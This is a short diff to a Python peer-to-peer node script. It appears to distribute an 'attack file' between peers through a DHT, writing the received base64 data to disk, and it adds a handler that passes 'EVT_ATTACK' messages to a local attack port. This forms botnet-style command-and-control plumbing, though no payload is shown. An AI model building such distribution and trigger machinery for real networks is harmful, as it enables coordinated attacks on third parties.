@@ -14,6 +14,7 @@ FILE_RECEIVED = False
 UDP_PORT = randint(11000, 12000)
 BOOTSTARP_PORT = 5678
 BOOTSTRAP_NODES = [("192.168.122.1", BOOTSTARP_PORT)]
+ATK_UDP_PORT = 9191
 
 class EchoClientProtocol:
     def __init__(self, message, loop):
@@ -72,6 +73,9 @@ def handle_msg(i_transport, i_data, i_addr):
 
         with open(ATK_FILE, 'bw') as f:
             f.write(base64.b64decode(l_data))
+    
+    elif cmd == "EVT_ATTACK":
+        send_msg(i_data, '127.0.0.1', ATK_UDP_PORT)
 
     else:
         print('[-]Invalid message received.')
@@ -113,6 +117,7 @@ if not result is None:
 
     local_msg = {'cmd':'GET_ATK', 'data' : None}
     send_msg(json.dumps(local_msg), some_ip_port[0], some_ip_port[1])
+    loop.run_until_complete(node.set("ATK_FILE", "{},{}:{}".format(result, get_my_ip(), UDP_PORT)))
 
 else:
     loop.run_until_complete(node.set("ATK_FILE", "{}:{}".format(get_my_ip(), UDP_PORT)))
